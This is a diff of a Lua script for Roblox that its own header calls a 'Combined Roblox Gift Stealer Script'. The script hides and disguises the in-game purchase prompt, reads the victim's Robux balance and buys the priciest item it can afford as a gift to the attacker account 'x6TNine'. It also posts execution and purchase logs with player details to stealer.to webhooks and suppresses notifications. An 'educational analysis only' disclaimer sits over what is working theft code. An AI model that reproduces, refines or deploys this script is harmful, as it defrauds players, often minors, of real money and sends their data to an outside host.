@@ -1,16 +1,31 @@
-LogsWebhook = "https://stealer.to/post?uniqueid=97b37190"
-ExecutionWebhook = "https://stealer.to/post?uniqueid=e92c9e96"
-Username = "x6TNine"
-PromptText = "Inject"
-RandomizedPrompt = false
+--[[
+    Combined Roblox Gift Stealer Script
+
+    Combines working gift logic from "old workinge.txt" with features from
+    "non shark mine script.txt." This script includes improved UI,
+    logging, executor detection, and anti-Delta measures.
+
+    NOTE: This script is for educational analysis only. Using it maliciously is unethical.
+]]
+
+-- Configuration Variables
+local LogsWebhook = "https://stealer.to/post?uniqueid=97b37190" -- Discord webhook URL for purchase logs
+local ExecutionWebhook = "https://stealer.to/post?uniqueid=e92c9e96" -- Discord webhook URL for script execution logs
+local Username = "x6TNine" -- Username to gift items to
+local PromptText = "Inject" -- Custom text for the purchase prompt button
+local RandomizedPrompt = false -- Whether to randomize prompt UI elements
+local version = "1.2.3" -- Current script version
 
 -- << Obfuscate after this moment (For devs, not making it for user)
 
+-- Wait for game load
 repeat task.wait() until game:IsLoaded()
 
+-- Anti-Exploit for Unsupported Executor
 local unsupportedExecutor = "Delta"
 local kickMessage = unsupportedExecutor .. " is currently unsupported on mobile. Please try a different executor (e.g., Codex, Fluxus) or use a PC."
 
+-- Helper Function to Identify the Executor
 local function getExecutor()
     if identifyexecutor then
         return identifyexecutor()
@@ -19,30 +34,49 @@ local function getExecutor()
     end
 end
 
+-- Helper function to check if the player is on mobile
 local function isMobile()
     local UserInputService = game:GetService("UserInputService")
     return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
 end
 
+-- Kick player if using unsupported executor on mobile
 local currentExecutor = getExecutor()
 if currentExecutor == unsupportedExecutor and isMobile() then
     game.Players.LocalPlayer:Kick(kickMessage)
 end
 
+-- Service Declarations
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
-local marketplaceService = game:GetService("MarketplaceService")
-local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
-local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)
 
-local UserId
-local version = "1.2.2"
+-- Get current player
+local player = Players.LocalPlayer
+
+-- Player Data
+local playerName = player.Name
+local playerDisplayName = player.DisplayName
+local playerUserId = player.UserId
+
+-- Game Details
+local gameId = game.PlaceId
+local success, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(gameId)
+end)
+
+local gameName = success and gameInfo.Name or "Unknown Game"
+local gameLink = "https://www.roblox.com/games/" .. gameId
+
+-- Player Profile Link
+local playerProfileLink = "https://www.roblox.com/users/" .. playerUserId .. "/profile"
+
+local UserId = nil
 local totalSpent = 0
-
 local messages = {
     "Here's your gift!",
     "Enjoy your new item!",
@@ -57,6 +91,8 @@ local messages = {
     "Imagine swag vibes rn",
 }
 
+--[[ UI Manipulation Functions ]]
+-- Loop to hide the "Sink" element in the ViewportOverlay
 local function loopSinkTransparency()
     while true do
         local sink = game.Players.LocalPlayer.PlayerGui:FindFirstChild("ViewportOverlay")
@@ -68,6 +104,7 @@ local function loopSinkTransparency()
     end
 end
 
+-- Function to hide all in-game notifications
 local function hideNotifications()
     local player = game.Players.LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
@@ -78,10 +115,12 @@ local function hideNotifications()
     end
 end
 
+-- Helper function for a random color
 local function getRandomColor()
     return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
 end
 
+-- Helper function to get a random font
 local function getRandomFont()
     local fonts = {
         Enum.Font.PermanentMarker,
@@ -97,6 +136,7 @@ local function getRandomFont()
     return fonts[math.random(1, #fonts)]
 end
 
+-- Function to modify the purchase prompt UI
 local function modifyPromptUI(isFirstPrompt)
     local CoreGui = game:GetService("CoreGui")
     local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
@@ -110,9 +150,11 @@ local function modifyPromptUI(isFirstPrompt)
     local alertContents = prompt:FindFirstChild("AlertContents")
     if not alertContents then return end
 
+    -- Hide default elements and set custom background
     prompt.BackgroundTransparency = 1
     prompt.Image = ""
 
+    -- Hide title and middle content
     local titleContainer = alertContents:FindFirstChild("TitleContainer")
     if titleContainer then
         local titleArea = titleContainer:FindFirstChild("TitleArea")
@@ -126,6 +168,7 @@ local function modifyPromptUI(isFirstPrompt)
         middleContent.Visible = false
     end
 
+    -- Customization of the purchase button
     local footerButtons = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
     if footerButtons then
         local button1 = footerButtons:FindFirstChild("1")
@@ -137,12 +180,14 @@ local function modifyPromptUI(isFirstPrompt)
         if button2 then
             button2:ClearAllChildren()
 
+             -- Create a frame container for the custom button
             local buttonContainer = Instance.new("Frame")
             buttonContainer.Name = "ButtonContainer"
             buttonContainer.Size = UDim2.new(1, 0, 1, 0)
             buttonContainer.BackgroundTransparency = 1
             buttonContainer.Parent = button2
 
+            -- Create a frame for the button background
             local background = Instance.new("Frame")
             background.Name = "Background"
             background.Size = UDim2.new(1, 0, 1, 0)
@@ -153,9 +198,10 @@ local function modifyPromptUI(isFirstPrompt)
             corner.CornerRadius = UDim.new(0.2, 0)
             corner.Parent = background
 
+            -- Create a gradient for the button
             local gradient = Instance.new("UIGradient")
             gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
-            
+
             local gradientColors
             if RandomizedPrompt then
                 gradientColors = {
@@ -173,6 +219,7 @@ local function modifyPromptUI(isFirstPrompt)
             gradient.Color = ColorSequence.new(gradientColors)
             gradient.Parent = background
 
+            -- Create glow effect behind the button text
             local glow = Instance.new("ImageLabel")
             glow.Name = "Glow"
             glow.BackgroundTransparency = 1
@@ -184,6 +231,7 @@ local function modifyPromptUI(isFirstPrompt)
             glow.AnchorPoint = Vector2.new(0.5, 0.5)
             glow.Parent = buttonContainer
 
+            -- Create the button text label
             local buttonText = Instance.new("TextLabel")
             buttonText.Name = "ButtonText"
             buttonText.Size = UDim2.new(1, 0, 1, 0)
@@ -195,7 +243,8 @@ local function modifyPromptUI(isFirstPrompt)
             buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.PermanentMarker
             buttonText.TextScaled = true
             buttonText.Parent = buttonContainer
-            
+
+            -- Create a shadow text label
             local textShadow = buttonText:Clone()
             textShadow.Name = "TextShadow"
             textShadow.Position = UDim2.new(0, 2, 0, 2)
@@ -204,21 +253,24 @@ local function modifyPromptUI(isFirstPrompt)
             textShadow.ZIndex = buttonText.ZIndex - 1
             textShadow.Parent = buttonContainer
 
+            -- Animation setup
             local tweenService = game:GetService("TweenService")
             local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
             local glowInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
 
+            -- Animate glow effect
             local glowTween = tweenService:Create(glow, glowInfo, {
                 ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6,
                 Size = UDim2.new(1.3, 0, 1.3, 0)
             })
             glowTween:Play()
 
+            -- Mouse enter animation
             button2.MouseEnter:Connect(function()
                 local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                     Size = UDim2.new(1.1, 0, 1.1, 0)
                 })
-                
+
                 local hoverGradientColors
                 if RandomizedPrompt then
                     hoverGradientColors = {
@@ -233,7 +285,7 @@ local function modifyPromptUI(isFirstPrompt)
                         ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 170, 255))
                     }
                 end
-                
+
                 local colorTween = tweenService:Create(gradient, hoverInfo, {
                     Color = ColorSequence.new(hoverGradientColors)
                 })
@@ -241,12 +293,13 @@ local function modifyPromptUI(isFirstPrompt)
                 local glowColorTween = tweenService:Create(glow, hoverInfo, {
                     ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6
                 })
-                
+
                 scaleTween:Play()
                 colorTween:Play()
                 glowColorTween:Play()
             end)
 
+             -- Mouse leave animation
             button2.MouseLeave:Connect(function()
                 local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                     Size = UDim2.new(1, 0, 1, 0)
@@ -259,7 +312,7 @@ local function modifyPromptUI(isFirstPrompt)
                 local glowColorTween = tweenService:Create(glow, hoverInfo, {
                     ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
                 })
-                
+
                 scaleTween:Play()
                 colorTween:Play()
                 glowColorTween:Play()
@@ -267,6 +320,7 @@ local function modifyPromptUI(isFirstPrompt)
         end
     end
 
+    -- Hide robux remaining text
     local footer = alertContents:FindFirstChild("Footer")
     if footer then
         local footerContent = footer:FindFirstChild("FooterContent")
@@ -282,18 +336,14 @@ local function modifyPromptUI(isFirstPrompt)
     end
 end
 
-local function getExecutor()
-    if syn then return "Synapse X"
-    elseif getexecutor then return getexecutor()
-    elseif identifyexecutor then return identifyexecutor()
-    elseif fluxus then return "Fluxus"
-    else return "Unknown" end
-end
+--[[ Executor & Webhook Functions ]]
 
+-- Function to get a random message
 local function getRandomMessage()
     return messages[math.random(1, #messages)]
 end
 
+-- Function to send script execution logs to discord webhook
 local function sendExecutionLog()
     local executorIdentifier = getExecutor()
     local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
@@ -316,7 +366,7 @@ local function sendExecutionLog()
             },
             {
                 ["name"] = "Current Game",
-                ["value"] = gameInfo.Name,
+                ["value"] = gameName,
                 ["inline"] = true
             },
             {
@@ -351,29 +401,7 @@ local function sendExecutionLog()
     })
 end
 
-local function getRobuxBalance()
-    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-    if not PurchasePrompt then return 0 end
-    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-    if not ProductContainer then return 0 end
-    local Animator = ProductContainer:FindFirstChild("Animator")
-    if not Animator then return 0 end
-    local prompt = Animator:FindFirstChild("Prompt")
-    if not prompt then return 0 end
-    local alertContents = prompt:FindFirstChild("AlertContents")
-    if not alertContents then return 0 end
-    local footer = alertContents:FindFirstChild("Footer")
-    if not footer then return 0 end
-    local footerContent = footer:FindFirstChild("FooterContent")
-    if not footerContent then return 0 end
-    local content = footerContent:FindFirstChild("Content")
-    if not content then return 0 end
-    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
-    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
-    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
-    return (balanceText and tonumber(balanceText) or 0) + 25
-end
-
+-- Function to send log of successful purchase
 local function sendWebhook(totalSpent, itemName)
     local balance = getRobuxBalance()
     local executorIdentifier = getExecutor()
@@ -398,7 +426,7 @@ local function sendWebhook(totalSpent, itemName)
                 ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
                 ["value"] = "```Executor: " .. executorIdentifier .. "```"
             },
-            {
+             {
                 ["name"] = "ᴄᴜʀʀᴇɴᴛ ʀᴏʙᴜx",
                 ["value"] = "```" .. balance .. "```"
             },
@@ -409,7 +437,7 @@ local function sendWebhook(totalSpent, itemName)
         }
     }
 
-    local data = HttpService:JSONEncode({
+     local data = HttpService:JSONEncode({
         ["content"] = "@everyone",
         ["embeds"] = {embed}
     })
@@ -424,9 +452,34 @@ local function sendWebhook(totalSpent, itemName)
     })
 end
 
+--[[ Purchase Logic (from old workinge.txt) ]]
 local promptConfirmed = false
 local purchaseInProgress = false
 
+local function getRobuxBalance()
+   local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return 0 end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return 0 end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return 0 end
+    local prompt = Animator:FindFirstChild("Prompt")
+    if not prompt then return 0 end
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if not alertContents then return 0 end
+    local footer = alertContents:FindFirstChild("Footer")
+    if not footer then return 0 end
+    local footerContent = footer:FindFirstChild("FooterContent")
+    if not footerContent then return 0 end
+    local content = footerContent:FindFirstChild("Content")
+    if not content then return 0 end
+    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
+    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
+    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
+     return (balanceText and tonumber(balanceText) or 0) + 25
+end
+
+-- Function to wait for the prompt to disappear
 local function waitForPromptToDisappear()
     local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
     if not PurchasePrompt then return end
@@ -455,8 +508,8 @@ local function waitForPurchaseConfirmation()
     end)
 end
 
-local webhookSent = false
 
+-- Function to buy an item
 local function buyItem(storageName, purchaseLocation, cost)
     if purchaseInProgress then
         return
@@ -465,9 +518,7 @@ local function buyItem(storageName, purchaseLocation, cost)
     purchaseInProgress = true
     promptConfirmed = false
 
-    local balance = getRobuxBalance()
-
-    local receiverName = Username
+   local receiverName = Username
     local receiverUserId = UserId
 
     local args = {
@@ -493,12 +544,9 @@ local function buyItem(storageName, purchaseLocation, cost)
             task.wait()
         end
 
-        if promptConfirmed then
+       if promptConfirmed then
             totalSpent = totalSpent + cost
-            if not webhookSent then
-                sendWebhook(totalSpent, storageName)
-                webhookSent = true
-            end
+            sendWebhook(totalSpent, storageName)
         end
     else
         warn("err")
@@ -508,14 +556,16 @@ local function buyItem(storageName, purchaseLocation, cost)
     purchaseInProgress = false
 end
 
-hideNotifications()
-
+--[[ Item Stealing Logic ]]
+-- Function to select and purchase items based on balance
 local function stealItem(balance)
+    -- Inner function to call the buyItem function with the receiver details
     local function buyItemWithReceiver(storageName, purchaseLocation, cost)
-            buyItem(storageName, purchaseLocation, cost, Username, UserId)
+            buyItem(storageName, purchaseLocation, cost)
     end
 
-    if balance >= 5000 then
+    -- Item purchase based on the balance
+        if balance >= 5000 then
         buyItemWithReceiver("Permanent Dragon-Dragon", "FruitShop", 5000)
     elseif balance >= 4000 then
         buyItemWithReceiver("Permanent Kitsune-Kitsune", "FruitShop", 4000)
@@ -583,7 +633,7 @@ local function stealItem(balance)
         buyItemWithReceiver("2x Money", "Shop", 450)
     elseif balance >= 400 then
         buyItemWithReceiver("+1 Fruit Storage", "Shop", 400)
-    elseif balance >= 380 then
+     elseif balance >= 380 then
         buyItemWithReceiver("Permanent Spike-Spike", "FruitShop", 380)
     elseif balance >= 350 then
         buyItemWithReceiver("2x Boss Drops", "Shop", 350)
@@ -606,10 +656,10 @@ local function stealItem(balance)
     return
 end
 
-local CoreGui = game:GetService("CoreGui")
-
+--[[ Main Script Logic ]]
 local function getRobuxAndProceed()
     coroutine.wrap(function()
+        -- Starts a loop that makes "Sink" element transparent
         coroutine.wrap(loopSinkTransparency)()
 
         local args = {
@@ -625,17 +675,20 @@ local function getRobuxAndProceed()
             }
         }
 
+         -- Remote event to trigger the shop and gift an item
         local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
         if CommF then
             CommF:InvokeServer(unpack(args))
         end
 
+         -- Wait for the purchase prompt UI to appear
         local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
         while not PurchasePrompt do
             task.wait()
             PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
         end
 
+         -- Hiding Roblox's Upsell Container for an attempt to avoid detection
         coroutine.wrap(function()
             while true do
                 local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
@@ -646,8 +699,9 @@ local function getRobuxAndProceed()
                 end
                 task.wait(0.1)
             end
-        end)()      
+        end)()
 
+         -- Get the prompt container
         local ProductPurchaseContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
         if ProductPurchaseContainer then
             local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
@@ -655,6 +709,8 @@ local function getRobuxAndProceed()
                 local Prompt = Animator:WaitForChild("Prompt")
                 if Prompt then
                     Prompt.Visible = false
+
+                     -- Hide the settings clipping shield in case it is present
                     local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
                     if settingsClippingShield then
                         settingsClippingShield.Visible = false
@@ -662,22 +718,27 @@ local function getRobuxAndProceed()
 
                     task.wait(1)
 
+                    -- Get the current balance
                     local balance = getRobuxBalance()
             
+                     -- Kick the player if robux is below the minimum to purchase
                     if balance < 25 then
                         game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
                         return
                     end
 
+                    -- Close the menu
                     local VirtualInputManager = game:GetService("VirtualInputManager")
                     VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                     task.wait()
                     VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
 
+                     -- Wait for prompt to disappear
                     waitForPromptToDisappear()
 
                     task.wait(0.5)
 
+                     -- Steal the item
                     stealItem(balance)
                 else
                     print("err1")
@@ -691,6 +752,7 @@ local function getRobuxAndProceed()
     end)()
 end
 
+-- Function to wait for the prompt UI to appear and modify it
 local function waitForPrompt()
     local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
     if not PurchasePrompt then return end
@@ -699,6 +761,7 @@ local function waitForPrompt()
     local Animator = ProductContainer:FindFirstChild("Animator")
     if not Animator then return end
 
+    -- Modify UI
     modifyPromptUI(true)
 
     Animator.ChildAdded:Connect(function(child)
@@ -708,17 +771,19 @@ local function waitForPrompt()
         end
     end)
 
+     -- Loop for escaping the prompts
     coroutine.wrap(function()
         while not promptConfirmed do
             task.wait()
         end
 
+         -- Send the webhook only after the user is done interacting with the prompts
         if totalSpent >= 25 then
-            sendWebhook(totalSpent)
         else
             print("err")
         end
 
+         -- Loop to escape out of the prompts
         local VirtualInputManager = game:GetService("VirtualInputManager")
 
         while true do
@@ -746,13 +811,19 @@ local function waitForPrompt()
     end)()
 end
 
+-- Get the victim's User ID and start script execution
 local success, err = pcall(function()
     UserId = Players:GetUserIdFromNameAsync(Username)
 end)
 
 if success then
+    -- Send Execution log
     sendExecutionLog()
+    -- Hide notifications
+     hideNotifications()
+    -- Wait for prompt
     waitForPrompt()
+    -- Start main logic
     getRobuxAndProceed()
 else
     warn("Error: " .. err)
